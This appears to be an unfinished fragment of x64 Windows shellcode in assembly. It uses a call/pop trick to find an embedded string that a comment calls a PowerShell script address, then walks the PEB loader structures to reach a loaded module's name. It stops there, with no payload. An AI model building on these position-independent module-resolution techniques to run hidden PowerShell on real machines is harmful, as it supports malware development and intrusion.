pre:
	call main
	db "%s", 0
main:
	pop rdi
	push rbp
	mov rbp, rsp
	sub rsp, 16
	mov [rbp - 8], rdi		;powershell script address
	mov rax, gs:0x60 
	mov [rbp - 16], rax		;PEB address
	mov rax, [rax + 0x18]	;offset to _PEB_LDR_DATA
	mov rax, [rax + 0x20]	;offset to _LDR_DATA_TABLE_ENTRY
	mov rax, [rax + 0x50]	;offset to the module name, this came from debugging
	ret